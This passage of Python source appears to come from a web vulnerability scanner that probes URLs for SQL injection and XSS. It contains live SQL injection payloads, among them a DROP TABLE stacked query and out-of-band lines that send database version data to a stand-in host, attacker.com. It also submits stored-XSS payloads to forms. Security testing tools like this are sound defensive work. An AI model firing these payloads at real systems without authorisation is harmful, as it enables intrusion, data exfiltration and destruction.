                            'true_similarity': similarity_with_true,
                            'false_similarity': similarity_with_false,
                            'length_difference': {
                                'baseline': baseline['length'],
                                'true': true_response['length'],
                                'false': false_response['length']
                            }
                        },
                        'technique': 'Boolean condition differential'
                    }
        
        return None

    def _test_boolean_condition(self, url, param_name, param_value, method, post_data, payload):
        """测试布尔条件"""
        try:
            test_value = f"{param_value}{payload}"
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }

            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, test_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = test_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                content = response['response'].get('content', '')
                # 确保content是字符串
                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                return {
                    'content': content,
                    'length': response['response'].get('content_length', 0),
                    'status': response['response'].get('status_code', 0)
                }

        except Exception:
            return None
    
    # ==================== 时间盲注检测 ====================
    def detect_time_based(self, url, param_name, param_value, method, post_data):
        """时间盲注检测 - 使用配置文件payload"""
        time_payloads = self.sql_payloads.get("time_based", [])
        
        if not time_payloads:
            # 如果没有配置的时间payload，使用默认的
            time_payloads = [
                {"payload": "' AND SLEEP(5)--", "database": "mysql"},
                {"payload": "' OR SLEEP(5)--", "database": "mysql"},
                {"payload": "' AND (SELECT pg_sleep(5))--", "database": "postgresql"},
                {"payload": "'; WAITFOR DELAY '00:00:05'--", "database": "mssql"},
                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--", "database": "oracle"}
            ]
        
        # 首先获取正常响应时间
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        
        for payload_info in time_payloads[:5]:  # 只测试前5个，避免耗时过长
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True,
                    'timeout': self.sql_thresholds['time_based_threshold'] + 10
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                elapsed_time = time.time() - start_time
                
                # 检查是否超时或明显延迟
                if elapsed_time > self.sql_thresholds['time_based_threshold']:
                    # 验证：发送不延迟的payload对比
                    no_delay_value = f"{param_value}' AND '1'='1"
                    no_delay_time = self._measure_response_time(
                        url, param_name, no_delay_value, method, post_data
                    )
                    
                    if elapsed_time > no_delay_time * 3:  # 延迟至少3倍
                        return {
                            'type': 'Time-Based Blind SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            #'confidence': 'Medium',
                            'confidence': '中',
                            'evidence': {
                                'normal_response_time': normal_time,
                                'delayed_response_time': elapsed_time,
                                'threshold': self.sql_thresholds['time_based_threshold']
                            },
                            'technique': 'Time delay'
                        }
                        
            except Exception as e:
                # 超时也可能是时间盲注的特征
                if "timeout" in str(e).lower() or "time out" in str(e).lower():
                    return {
                        'type': 'Time-Based Blind SQL Injection (Timeout)',
                        'payload': payload,
                        'database': db_type,
                        #'confidence': 'Low-Medium',
                        'confidence': '中',
                        'evidence': 'Request timeout occurred',
                        'technique': 'Request timeout'
                    }
                continue
        
        return None

    def _measure_response_time(self, url, param_name, param_value, method, post_data):
        """测量响应时间"""
        try:
            start_time = time.time()
            
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            response = self.send_controlled_request(request_info)
            if response:
                return time.time() - start_time
        except:
            return float('inf')
    
    # ==================== 联合查询检测 ====================
    def detect_union_based(self, url, param_name, param_value, method, post_data, baseline):
        """联合查询注入检测"""
        # 先探测列数
        column_count = self._detect_column_count(url, param_name, param_value, method, post_data)
        
        if column_count > 0:
            # 尝试在可显示位置注入标记
            marker = "SQL_INJECTION_TEST_" + str(int(time.time()))
            
            # 构建联合查询payload
            select_parts = []
            for i in range(column_count):
                if i == 0:  # 第一个位置放标记
                    select_parts.append(f"'{marker}'")
                else:
                    select_parts.append("NULL")
            
            union_payload = f"' UNION SELECT {','.join(select_parts)}--"
            test_value = f"{param_value}{union_payload}"
            
            try:
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    # 检查响应中是否包含标记
                    if marker in response['response']['content']:
                        # 尝试获取数据库信息
                        info_payloads = [
                            f"' UNION SELECT version(),{','.join(['NULL']*(column_count-1))}--",
                            f"' UNION SELECT user(),{','.join(['NULL']*(column_count-1))}--",
                            f"' UNION SELECT database(),{','.join(['NULL']*(column_count-1))}--"
                        ]
                        
                        for info_payload in info_payloads:
                            info_value = f"{param_value}{info_payload}"
                            info_response = self._send_request(url, param_name, info_value, method, post_data)
                            
                            if info_response:
                                # 提取可能的数据库信息
                                db_info = self._extract_database_info(info_response['response']['content'])
                                if db_info:
                                    return {
                                        'type': 'Union-Based SQL Injection',
                                        'confidence': 'High',
                                        'column_count': column_count,
                                        'evidence': {
                                            'marker_found': True,
                                            'database_info': db_info,
                                            'injectable_column': 0
                                        },
                                        'technique': 'Union query'
                                    }
                        
                        return {
                            'type': 'Union-Based SQL Injection',
                            'confidence': 'High',
                            'column_count': column_count,
                            'evidence': {'marker_found': True},
                            'technique': 'Union query'
                        }
                        
            except Exception as e:
                pass
        
        return None

    def _detect_column_count(self, url, param_name, param_value, method, post_data):
        """探测联合查询的列数"""
        for i in range(1, 11):  # 尝试1-10列
            null_list = ['NULL'] * i
            order_payload = f"' ORDER BY {i}--"
            union_payload = f"' UNION SELECT {','.join(null_list)}--"
            
            # 先尝试ORDER BY方法
            order_value = f"{param_value}{order_payload}"
            order_response = self._send_request(url, param_name, order_value, method, post_data)
            
            if order_response and order_response['response']['status_code'] < 500:
                # 再验证UNION查询
                union_value = f"{param_value}{union_payload}"
                union_response = self._send_request(url, param_name, union_value, method, post_data)
                
                if union_response and union_response['response']['status_code'] < 500:
                    # 检查是否有语法错误
                    error = self._check_for_database_errors(union_response['response']['content'])
                    if not error:
                        return i
        
        return 0

    def _send_request(self, url, param_name, param_value, method, post_data):
        """发送请求的通用方法"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except:
            return None

    def _calculate_similarity(self, text1, text2):
        """计算两个文本的相似度（简化版）"""
        # 确保两个参数都是字符串
        if not isinstance(text1, str):
            if text1 is None:
                text1 = ''
            else:
                text1 = str(text1)

        if not isinstance(text2, str):
            if text2 is None:
                text2 = ''
            else:
                text2 = str(text2)

        if not text1 or not text2:
            return 0

        # 使用基于字符的简单相似度计算
        set1 = set(text1[:1000])  # 只比较前1000个字符
        set2 = set(text2[:1000])

        if not set1 or not set2:
            return 0

        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))

        return intersection / union if union > 0 else 0

    def _extract_database_info(self, response_text):
        """从响应中提取可能的数据库信息"""
        patterns = {
            'mysql': r"[\d\.]+-MySQL",
            'postgresql': r"PostgreSQL [\d\.]+",
            'mssql': r"Microsoft SQL Server [\d\.]+",
            'oracle': r"Oracle Database [\d\.]+",
            'sqlite': r"SQLite [\d\.]+"
        }
        
        for db_type, pattern in patterns.items():
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return {
                    'type': db_type,
                    'version': match.group(0)
                }
        
        return None

    # ==================== 堆叠查询检测 ====================
    def detect_stacked_queries(self, url, param_name, param_value, method, post_data):
        """堆叠查询检测（支持多语句执行）"""
        stacked_payloads = self.sql_payloads.get("stacked", [])
        
        if not stacked_payloads:
            # 如果没有配置的堆叠payload，使用默认的
            stacked_payloads = [
                {"payload": "'; SELECT 'stacked'--", "database": "generic"},
                {"payload": "'; WAITFOR DELAY '00:00:02'--", "database": "mssql"},
                {"payload": "'; DROP TABLE IF EXISTS test_table--", "database": "generic"}
            ]
        
        for payload_info in stacked_payloads[:5]:  # 只测试前5个
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    # 检查响应中是否有堆叠查询的特征
                    if self._check_stacked_indicator(response['response']['content']):
                        # 验证：发送不包含堆叠的payload
                        safe_value = f"{param_value}' AND '1'='1"
                        safe_response = self._send_request(url, param_name, safe_value, method, post_data)
                        
                        if safe_response and response['response']['content'] != safe_response['response']['content']:
                            return {
                                'type': 'Stacked Queries SQL Injection',
                                'payload': payload,
                                'database': db_type,
                                #'confidence': 'Medium',
                                'confidence': '中',
                                'evidence': 'Stacked query indicator found',
                                'technique': 'Multiple statement execution'
                            }
                            
            except Exception:
                continue
        
        return None

    def _check_stacked_indicator(self, response_text):
        """检查堆叠查询的指示器"""
        indicators = [
            "stacked",
            "multiple statements",
            "batch execution",
            "xp_cmdshell",
            "command executed"
        ]
        
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return True
        
        return False

    # ==================== 综合SQL注入检测 ====================
    
    # def check_sql_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
    #     """
    #     全面的SQL注入检测入口
    #     """
    #     # 确保url是字符串类型
    #     if isinstance(url, list):
    #         print(f"⚠️  警告: url参数是列表类型，将使用第一个元素")
    #         if url:
    #             url = url[0]
    #         else:
    #             print(f"❌ 错误: url列表为空")
    #             return {
    #                 'vulnerable': False,
    #                 'confidence': 'None',
    #                 'summary': 'Invalid URL provided'
    #             }, []

    #     if not isinstance(url, str):
    #         print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
    #         return {
    #             'vulnerable': False,
    #             'confidence': 'None',
    #             'summary': f'Invalid URL type: {type(url)}'
    #         }, []

    #     # 确保url是有效的URL格式
    #     if not url.startswith(('http://', 'https://')):
    #         print(f"⚠️  警告: URL缺少协议，添加http://")
    #         url = f"http://{url}"

    #     print(f"\n🔍 开始全面检测SQL注入: {url}")

    #     if param_name and param_value:
    #         print(f"   参数: {param_name} = {param_value}")
    #     print(f"   方法: {method}")

    #     try:
    #         # 获取基准响应（用于后续对比）
    #         baseline = self.get_baseline_response(url, param_name or "id", param_value or "1", method, post_data)

    #         # 执行所有类型的检测
    #         detection_results = []

    #         # 1. 基于错误的检测
    #         print("\n[1/6] 基于错误的注入检测...")
    #         error_result = self.detect_error_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
    #         if error_result:
    #             detection_results.append(error_result)
    #             print(f"   ✅ 发现错误型注入漏洞")

    #         # 2. 布尔盲注检测
    #         print("[2/6] 布尔盲注检测...")
    #         boolean_result = self.detect_boolean_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
    #         if boolean_result:
    #             detection_results.append(boolean_result)
    #             print(f"   ✅ 发现布尔盲注漏洞")

    #         # 3. 时间盲注检测
    #         print("[3/6] 时间盲注检测...")
    #         time_result = self.detect_time_based(url, param_name or "id", param_value or "1", method, post_data)
    #         if time_result:
    #             detection_results.append(time_result)
    #             print(f"   ✅ 发现时间盲注漏洞")

    #         # 4. 联合查询检测
    #         print("[4/6] 联合查询注入检测...")
    #         union_result = self.detect_union_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
    #         if union_result:
    #             detection_results.append(union_result)
    #             print(f"   ✅ 发现联合查询注入漏洞")

    #         # 5. 堆叠查询检测
    #         print("[5/6] 堆叠查询检测...")
    #         stacked_result = self.detect_stacked_queries(url, param_name or "id", param_value or "1", method, post_data)
    #         if stacked_result:
    #             detection_results.append(stacked_result)
    #             print(f"   ✅ 发现堆叠查询漏洞")

    #         # 6. 带外数据检测（DNS/HTTP）
    #         print("[6/6] 带外数据检测...")
    #         oob_result = self.detect_out_of_band(url, param_name or "id", param_value or "1", method, post_data)
    #         if oob_result:
    #             detection_results.append(oob_result)
    #             print(f"   ✅ 发现带外数据泄露漏洞")

    #         # 综合判定
    #         final_verdict = self.evaluate_sql_results(detection_results, baseline)

    #         # 更新统计信息
    #         self.update_sql_statistics(detection_results)

    #         return final_verdict, detection_results

    #     except Exception as e:
    #         print(f"❌ SQL注入检测过程中发生错误: {e}")
    #         import traceback
    #         traceback.print_exc()

    #         return {
    #             'vulnerable': False,
    #             'confidence': 'None',
    #             'summary': f'Error during detection: {str(e)}'
    #         }, []

    def check_sql_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        全面的SQL注入检测入口
    
        Returns:
            tuple: (漏洞列表, 扫描结果统计)
        """
        # 确保url是字符串类型
        if isinstance(url, list):
            print(f"⚠️  警告: url参数是列表类型，将使用第一个元素")
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        # 确保url是有效的URL格式
        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"

        print(f"\n🔍 开始全面检测SQL注入: {url}")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应（用于后续对比）
            baseline = self.get_baseline_response(url, param_name or "id", param_value or "1", method, post_data)

            # 1. 基于错误的检测
            print("\n[1/6] 基于错误的注入检测...")
            error_result = self.detect_error_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if error_result:
                vulnerabilities.append(self._format_vulnerability(error_result, url, param_name, method))

            # 2. 布尔盲注检测
            print("[2/6] 布尔盲注检测...")
            boolean_result = self.detect_boolean_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if boolean_result:
                vulnerabilities.append(self._format_vulnerability(boolean_result, url, param_name, method))

            # 3. 时间盲注检测
            print("[3/6] 时间盲注检测...")
            time_result = self.detect_time_based(url, param_name or "id", param_value or "1", method, post_data)
            if time_result:
                vulnerabilities.append(self._format_vulnerability(time_result, url, param_name, method))

            # 4. 联合查询检测
            print("[4/6] 联合查询注入检测...")
            union_result = self.detect_union_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if union_result:
                vulnerabilities.append(self._format_vulnerability(union_result, url, param_name, method))

            # 5. 堆叠查询检测
            print("[5/6] 堆叠查询检测...")
            stacked_result = self.detect_stacked_queries(url, param_name or "id", param_value or "1", method, post_data)
            if stacked_result:
                vulnerabilities.append(self._format_vulnerability(stacked_result, url, param_name, method))

            # 6. 带外数据检测（DNS/HTTP）
            print("[6/6] 带外数据检测...")
            oob_result = self.detect_out_of_band(url, param_name or "id", param_value or "1", method, post_data)
            if oob_result:
                vulnerabilities.append(self._format_vulnerability(oob_result, url, param_name, method))

            # 更新统计信息
            self.update_sql_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            # 输出漏洞信息
            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    if 'error_indicator' in vuln:
                        print(f"   错误指示: {vuln['error_indicator']}")
                    print()

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ SQL注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def _format_vulnerability(self, detection_result, url, param_name, method):
        """
        格式化检测结果为统一漏洞格式
        """
        # 提取检测结果中的关键信息
        vuln_type_map = {
            'error_based': 'Error-based SQL Injection',
            'boolean_based': 'Boolean-based Blind SQL Injection',
            'time_based': 'Time-based Blind SQL Injection',
            'union_based': 'Union-based SQL Injection',
            'stacked_queries': 'Stacked Queries SQL Injection',
            'out_of_band': 'Out-of-band SQL Injection'
        }

        # 如果检测结果已经是字典格式，直接使用或转换
        if isinstance(detection_result, dict):
            # 确保有必要的字段
            vuln = detection_result.copy()
            vuln['url'] = url

            # 设置或确保参数名
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name

            # 设置或确保方法
            if 'method' not in vuln:
                vuln['method'] = method

            # 确保有类型字段
            if 'type' not in vuln and 'detection_type' in vuln:
                detection_type = vuln.get('detection_type', '').lower()
                vuln['type'] = vuln_type_map.get(detection_type, f"SQL Injection ({detection_type})")
            elif 'type' not in vuln:
                vuln['type'] = 'SQL Injection'

            # 确保有可信度字段
            if 'confidence' not in vuln and 'certainty' in vuln:
                vuln['confidence'] = vuln['certainty']
            elif 'confidence' not in vuln:
                #vuln['confidence'] = 'Medium'
                vuln['confidence'] = '中'

            return vuln
        else:
            # 如果不是字典格式，创建标准格式
            return {
                'url': url,
                'type': 'SQL Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                #'confidence': 'Medium',
                'confidence': '中',
                'description': str(detection_result)
            }

    def detect_out_of_band(self, url, param_name, param_value, method, post_data):
        """带外数据检测（DNS/HTTP）"""
        oob_payloads = self.sql_payloads.get("oob", [])
        
        if not oob_payloads:
            # 如果没有配置的OOB payload，使用默认的
            oob_payloads = [
                {"payload": "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test'))--", "database": "mysql"},
                {"payload": "'; EXEC master..xp_dirtree '\\\\\\\\'+(SELECT @@version)+'.attacker.com\\\\test'--", "database": "mssql"},
                {"payload": "'||UTL_HTTP.REQUEST('http://'||(SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com/test')--", "database": "oracle"}
            ]
        
        for payload_info in oob_payloads[:3]:  # 只测试前3个
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    # 在实际环境中，这里需要检查DNS/HTTP日志
                    # 这里简化处理：如果请求成功且没有错误，则认为是可能的带外漏洞
                    if response['response']['status_code'] < 500:
                        # 可以结合其他特征进一步判断
                        return {
                            'type': 'Out-of-Band SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            #'confidence': 'Low-Medium',
                            'confidence': '中',
                            'evidence': 'OOB payload executed without error',
                            'technique': 'DNS/HTTP exfiltration'
                        }
                        
            except Exception:
                continue
        
        return None

    def evaluate_sql_results(self, detection_results, baseline):
        """综合评估SQL注入检测结果"""
        if not detection_results:
            return {
                'vulnerable': False,
                'confidence': 'None',
                'summary': 'No SQL injection vulnerabilities detected'
            }
        
        # 按可信度排序
        confidence_map = {'High': 3, 'Medium-High': 2.5, 'Medium': 2, 'Low-Medium': 1.5, 'Low': 1}
        
        # 计算平均可信度
        total_weight = 0
        total_confidence = 0
        
        for result in detection_results:
            weight = confidence_map.get(result.get('confidence', 'Low'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(result['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        # 确定最终结论
        if avg_confidence >= 2.5:  # High or Medium-High
            verdict = 'Definitely Vulnerable'
            confidence = 'High'
        elif avg_confidence >= 1.5:  # Medium
            verdict = 'Likely Vulnerable'
            #confidence = 'Medium'
            confidence = '中'
        else:
            verdict = 'Potentially Vulnerable'
            confidence = 'Low'
        
        # 收集发现的漏洞类型
        vuln_types = set(r['type'] for r in detection_results)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(detection_results),
            'details': detection_results
        }

    def update_sql_statistics(self, vulnerabilities):
        """更新SQL注入统计信息"""
        stats = self.results['sql_statistics']
        
        if not vulnerabilities:
            return
        
        # 获取唯一的URL列表
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        # 按类型统计
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            # 按数据库类型统计
            db_type = vuln.get("database", "unknown")
            if not db_type or db_type == "unknown":
                db_type = vuln.get("database_type", "unknown")
            stats["by_database"][db_type] = stats["by_database"].get(db_type, 0) + 1
            
            # 按请求方法统计
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    # ==================== XSS检测功能 ====================
    def _extract_parameters(self, url):
        """从URL中提取参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # 转换为单个值的字典（而不是列表）
        single_params = {}
        for key, value in params.items():
            if value:
                single_params[key] = value[0]
        
        return single_params

    def _detect_xss_in_response(self, response_text, payload, original_value=None):
        """检测响应中是否存在XSS漏洞"""
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # 1. 检查payload是否在响应中反射
        if payload_lower in response_lower:
            # 检查是否被HTML编码
            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded_payload.lower() not in response_lower:
                # payload存在且没有被HTML编码，可能是漏洞
                
                # 检查payload是否出现在危险上下文中
                for indicator in self.xss_indicators:
                    if indicator in payload_lower and indicator in response_lower:
                        return True, "高", f"发现XSS payload在响应中反射且未编码，出现在危险上下文: {indicator}"
                
                # 检查payload是否出现在script标签中
                if '<script' in payload_lower and '<script' in response_lower:
                    script_start = response_lower.find('<script')
                    script_end = response_lower.find('</script>', script_start)
                    if script_start != -1 and script_end != -1:
                        script_content = response_text[script_start:script_end]
                        if payload in script_content:
                            return True, "高", "payload出现在<script>标签中"
                
                # 检查payload是否出现在事件处理器中
                events = ['onload=', 'onclick=', 'onmouseover=', 'onerror=']
                for event in events:
                    if event in payload_lower:
                        event_start = response_lower.find(event)
                        if event_start != -1:
                            # 检查事件处理器是否被正确转义
                            context = response_text[max(0, event_start-50):min(len(response_text), event_start+100)]
                            if payload in context:
                                return True, "中", f"payload出现在事件处理器中: {event}"
                
                return True, "低", "payload在响应中反射但未编码"
        
        # 2. 检查payload是否被部分反射
        payload_parts = payload.split()
        if len(payload_parts) > 1:
            reflected_parts = [part for part in payload_parts if part.lower() in response_lower]
            if len(reflected_parts) >= len(payload_parts) * 0.5:  # 超过一半的部分被反射
                return True, "中", f"payload部分被反射: {reflected_parts}"
        
        return False, "无", "未发现XSS漏洞"

    def check_xss(self, url_input, method='GET', data=None, cookies=None, headers=None):
        """完整的XSS扫描功能"""
        vulnerabilities = []
        
        # 统一处理输入：将单个URL转换为列表
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
        for url in urls:
            if not isinstance(url, str):
                print(f"跳过非字符串URL: {url}")
                continue
            
            print(f"\n[+] 开始XSS扫描URL: {url}")
            
            # 提取URL中的参数
            url_params = self._extract_parameters(url)
            
            # 准备要测试的参数
            test_params = {}
            
            # 如果提供了POST数据，则测试POST参数
            if method.upper() == 'POST' and data:
                test_params = data.copy()
            # 否则测试URL参数
            elif url_params:
                test_params = url_params.copy()
            # 如果没有参数，使用默认测试参数
            else:
                test_params = {'test': 'default'}
            
            if not test_params:
                print(f"[-] URL {url} 没有可测试的参数")
                continue
            
            print(f"[*] 发现 {len(test_params)} 个参数: {list(test_params.keys())}")
            
            # 测试每个参数
            for param_name, original_value in test_params.items():
                print(f"\n[*] 测试参数: {param_name}")
                
                for payload_idx, payload in enumerate(self.xss_payloads):
                    try:
                        # 构建请求
                        if method.upper() == 'POST':
                            # 对于POST请求，将payload注入到data中
                            test_data = data.copy() if data else {}
                            test_data[param_name] = payload
                            
                            request_info = {
                                'method': 'POST',
                                'url': url.split('?')[0],  # 移除查询参数
                                'headers': headers or {},
                                'data': test_data,
                                'cookies': cookies or {}
                            }
                        else:
                            # 对于GET请求，将payload注入到URL参数中
                            if url_params:
                                # 替换特定参数
                                test_params_copy = url_params.copy()
                                test_params_copy[param_name] = payload
                                
                                # 重建URL
                                parsed = urlparse(url)
                                query_string = '&'.join([f"{k}={v}" for k, v in test_params_copy.items()])
                                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                            else:
                                # 没有原始参数，添加新参数
                                test_url = f"{url}?{param_name}={payload}"
                            
                            request_info = {
                                'method': 'GET',
                                'url': test_url,
                                'headers': headers or {},
                                'cookies': cookies or {}
                            }
                        
                        print(f"  [>] 测试payload #{payload_idx+1}: {payload[:50]}...")
                        
                        # 发送请求
                        response = self.send_controlled_request(request_info)
                        
                        if response is None:
                            print(f"  [-] 请求失败: {url}")
                            continue
                        
                        # 检查响应
                        response_text = response.get('response', {}).get('text', '')
                        
                        # 检测XSS漏洞
                        is_vulnerable, confidence, details = self._detect_xss_in_response(
                            response_text, payload, original_value
                        )
                        
                        if is_vulnerable:
                            vuln_info = {
                                "url": url,
                                "type": "反射型XSS",
                                "parameter": param_name,
                                "payload": payload,
                                "confidence": confidence,
                                "method": method,
                                "details": details,
                                "response_code": response.get('response', {}).get('status_code'),
                                "tested_url": request_info.get('url') if method.upper() == 'GET' else url
                            }
                            
                            # 如果是POST请求，添加注入的数据
                            if method.upper() == 'POST':
                                vuln_info["injected_data"] = request_info.get('data')
                            
                            vulnerabilities.append(vuln_info)
                            
                            print(f"  [!] 发现XSS漏洞！置信度: {confidence}")
                            print(f"      详情: {details}")
                            
                            # 高置信度的漏洞不再测试更多payload
                            if confidence == "高":
                                break
                    
                    except Exception as e:
                        print(f"  [-] 测试参数 {param_name} 时出错: {e}")
                        continue
            
            # 测试存储型XSS（基础检测）
            if method.upper() == 'POST' and data:
                print(f"\n[*] 开始存储型XSS检测...")
                for payload in self.xss_payloads[:5]:  # 只测试前5个payload
                    try:
                        # 注入payload
                        test_data = data.copy()
                        for key in test_data.keys():
                            if isinstance(test_data[key], str):
                                test_data[key] = payload
                        
                        # 发送POST请求（提交数据）
                        request_info = {
                            'method': 'POST',
                            'url': url,
                            'headers': headers or {},
                            'data': test_data,
                            'cookies': cookies or {}
                        }
                        
                        response = self.send_controlled_request(request_info)
                        
                        if response and response.get('response', {}).get('status_code') in [200, 302]:
                            print(f"  [>] 已提交存储型XSS payload: {payload[:30]}...")
                            
                            # 稍等片刻后重新访问页面查看是否存储
                            time.sleep(1)
                            
                            # 重新访问页面
                            get_request_info = {
                                'method': 'GET',
                                'url': url,
                                'headers': headers or {},
                                'cookies': cookies or {}
                            }
                            
                            get_response = self.send_controlled_request(get_request_info)
                            
                            if get_response:
                                response_text = get_response.get('response', {}).get('text', '')
                                if payload.lower() in response_text.lower():
                                    vulnerabilities.append({
                                        "url": url,
                                        "type": "存储型XSS",
                                        "payload": payload,
                                        "confidence": "中",
                                        "details": "payload在后续访问中仍然存在",
                                        "method": "POST->GET"
                                    })
                                    print(f"  [!] 可能发现存储型XSS漏洞！")
                    
                    except Exception as e:
                        print(f"  [-] 存储型XSS测试出错: {e}")
        
        # 统计结果
        print(f"\n{'='*60}")
        print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
        # 按置信度排序
        vulnerabilities.sort(key=lambda x: {"高": 0, "中": 1, "低": 2}[x.get("confidence", "低")])
        
        # # 输出详细结果
        # for i, vuln in enumerate(vulnerabilities, 1):
        #     print(f"\n漏洞 #{i}:")
        #     print(f"  类型: {vuln['type']}")
        #             # 统计结果
        # print(f"\n{'='*60}")
        # print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
        # 按置信度排序
        vulnerabilities.sort(key=lambda x: {"高": 0, "中": 1, "低": 2}[x.get("confidence", "低")])
        
        # 输出详细结果
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n漏洞 #{i}:")
            print(f"  类型: {vuln['type']}")
            print(f"  URL: {vuln['url']}")
            print(f"  参数: {vuln.get('parameter', 'N/A')}")
            print(f"  方法: {vuln.get('method', 'GET')}")
